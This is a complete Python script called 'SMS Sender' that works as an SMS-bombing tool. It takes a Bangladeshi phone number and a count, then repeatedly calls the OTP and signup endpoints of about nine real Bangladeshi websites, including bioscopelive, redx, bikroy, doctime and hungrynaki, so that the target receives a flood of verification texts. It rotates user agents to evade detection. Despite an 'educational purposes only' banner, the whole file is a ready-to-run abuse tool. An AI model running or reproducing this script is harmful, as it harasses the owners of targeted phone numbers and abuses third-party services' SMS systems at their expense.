import sys
import time
import requests
import urllib3
from urllib.parse import urlparse
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich.prompt import Prompt
from rich.panel import Panel
from rich import box

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize Rich console
console = Console()

# User agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

user_agent_index = 0

def get_next_user_agent():
    global user_agent_index
    ua = USER_AGENTS[user_agent_index]
    user_agent_index = (user_agent_index + 1) % len(USER_AGENTS)
    return ua

def send_request(method, url, headers, data=None, json_data=None, params=None, cookies=None):
    new_headers = headers.copy()
    new_headers["user-agent"] = get_next_user_agent()
    session = requests.Session()
    session.verify = False
    try:
        if method.lower() == "get":
            response = session.get(url, headers=new_headers, params=params, cookies=cookies, timeout=10)
        elif method.lower() == "post":
            response = session.post(url, headers=new_headers, data=data, json=json_data, params=params, cookies=cookies, timeout=10)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        console.log(f"[red]Error sending request to {url}: {e}[/red]")
        return None

def get_base_referer(headers):
    referer = headers.get("referer", "")
    parsed = urlparse(referer)
    return f"{parsed.scheme}://{parsed.netloc}"

def validate_phone_number(phone):
    return phone.isdigit() and len(phone) == 10

def validate_limit(limit):
    try:
        limit = int(limit)
        return 1 <= limit <= 100  # Arbitrary max limit to prevent abuse
    except ValueError:
        return False

def display_welcome():
    console.print(Panel(
        "[bold cyan]Welcome to SMS Sender[/bold cyan]\n"
        "Developed by GrayByte\n"
        "[yellow]Note: This tool is for educational purposes only. Do not use for illegal activities.[/yellow]",
        title="SMS Sender",
        border_style="green",
        box=box.ROUNDED
    ))

def get_user_input():
    phone = Prompt.ask("[bold green]Enter phone number (without 880)[/bold green]")
    if not validate_phone_number(phone):
        console.print("[red]Invalid phone number! Must be 10 digits.[/red]")
        sys.exit(1)
    
    limit = Prompt.ask("[bold green]How many SMS to send?[/bold green]")
    if not validate_limit(limit):
        console.print("[red]Invalid limit! Must be a number between 1 and 100.[/red]")
        sys.exit(1)
    
    return phone, int(limit)

def send_sms(phone, limit):
    api_configs = [
        {
            "method": "get",
            "url": f"https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp",
            "headers": {
                'authority': 'www.bioscopelive.com',
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'referer': 'https://www.bioscopelive.com/en/login',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'XMLHttpRequest',
            }
        },
        {
            "method": "post",
            "url": "https://api.redx.com.bd/v1/user/signup",
            "headers": {
                'referer': 'https://redx.com.bd/',
            },
            "data": {
                'name': phone,
                'phoneNumber': phone,
                'service': 'redx',
            }
        },
        {
            "method": "get",
            "url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0{phone}",
            "headers": {
                'authority': 'bikroy.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'bn',
                'application-name': 'web',
                'referer': 'https://bikroy.com/bn/users/login',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
        },
        {
            "method": "get",
            "url": f"https://www.ieatery.com.bd/otp-verify?phn=0{phone}",
            "headers": {
                'authority': 'www.ieatery.com.bd',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'referer': 'https://www.ieatery.com.bd/login',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
            }
        },
        {
            "method": "post",
            "url": "https://admin.doctime.com.bd/api/authenticate",
            "headers": {
                'referer': 'https://doctime.com.bd/',
            },
            "data": {
                'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
                'code': '88',
                'contact_no': f'0{phone}',
                'country_calling_code': '88',
            }
        },
        {
            "method": "post",
            "url": "https://api.osudpotro.com/api/v1/users/send_otp",
            "headers": {
                'referer': 'https://osudpotro.com/',
            },
            "data": {
                'mobile': f'+88-0{phone}',
                'deviceToken': 'web',
                'language': 'en',
                'os': 'web',
            }
        },
        {
            "method": "post",
            "url": "https://api.osudpotro.com/api/v1/users/send_otp",
            "headers": {
                'referer': 'https://osudpotro.com/',
            },
            "data": {
                'mobile': f'+88-0{phone}',
                'deviceToken': 'web',
                'language': 'en',
                'os': 'web',
            }
        },
        {
            "method": "post",
            "url": "https://api-v4-1.hungrynaki.com/graphql",
            "headers": {
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Origin': 'https://hungrynaki.com',
                'Referer': 'https://hungrynaki.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'accept': '*/*',
                'content-type': 'application/json',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            },
            "json_data": {
                'operationName': 'createOtp',
                'variables': {
                    'phone': phone,
                    'country': '880',
                    'uuid': '6fdb595b-a310-4f82-acca-a9b9c43e4eb0',
                    'osVersionCode': 'Linux aarch64',
                    'deviceBrand': 'Chrome',
                    'deviceModel': '107',
                    'requestFrom': 'U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=',
                },
                'query': 'mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n',
            }
        },
        {
            "method": "post",
            "url": "https://fundesh.com.bd/api/auth/generateOTP",
            "headers": {
                'authority': 'fundesh.com.bd',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://fundesh.com.bd',
                'referer': 'https://fundesh.com.bd/fundesh/profile',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            },
            "params": {
                'service_key': '',
            },
            "json_data": {
                'msisdn': phone,
            },
            "cookies": {
                '_ga': 'GA1.3.1671188319.1677642641',
                '_gid': 'GA1.3.407134519.1677642641',
                '_gat_UA-146796176-2': '1',
                '_fbp': 'fb.2.1677642641903.2005162471',
                '_ga_5LF4359FD3': 'GS1.1.1677642640.1.1.1677642660.0.0.0',
            }
        },
        {
            "method": "get",
            "url": f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0{phone}",
            "headers": {
                'Accept': '*/*',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Origin': 'https://ecourier.com.bd',
                'Referer': 'https://ecourier.com.bd/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }
        }
    ]

    sent_count = 0
    results = []

    console.print("[yellow]API responses may be slow. SMS delivery could be delayed. Please be patient.[/yellow]\n")

    with Progress(console=console) as progress:
        task = progress.add_task("[cyan]Sending SMS...", total=limit)
        
        while sent_count < limit:
            for config in api_configs:
                if sent_count >= limit:
                    break
                
                response = send_request(
                    method=config["method"],
                    url=config["url"],
                    headers=config["headers"],
                    data=config.get("data"),
                    json_data=config.get("json_data"),
                    params=config.get("params"),
                    cookies=config.get("cookies")
                )
                
                if response and response.status_code == 200:
                    sent_count += 1
                    referer = get_base_referer(config["headers"])
                    results.append((referer, "Success"))
                    progress.update(task, advance=1)
                    console.log(f"[green][{sent_count}] Sent SMS via {referer}[/green]")
                else:
                    referer = get_base_referer(config["headers"])
                    results.append((referer, "Failed"))
                
                time.sleep(1)  # Prevent overwhelming APIs

    return results

def display_results(results):
    table = Table(title="SMS Sending Results", box=box.ROUNDED)
    table.add_column("API", style="cyan")
    table.add_column("Status", style="green")
    
    for referer, status in results:
        table.add_row(referer, status)
    
    console.print(table)
    console.print(f"[bold green]Total SMS sent: {sum(1 for _, status in results if status == 'Success')}[/bold green]")

def main():
    display_welcome()
    phone, limit = get_user_input()
    results = send_sms(phone, limit)
    display_results(results)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Operation cancelled by user.[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]An unexpected error occurred: {e}[/red]")
        sys.exit(1)
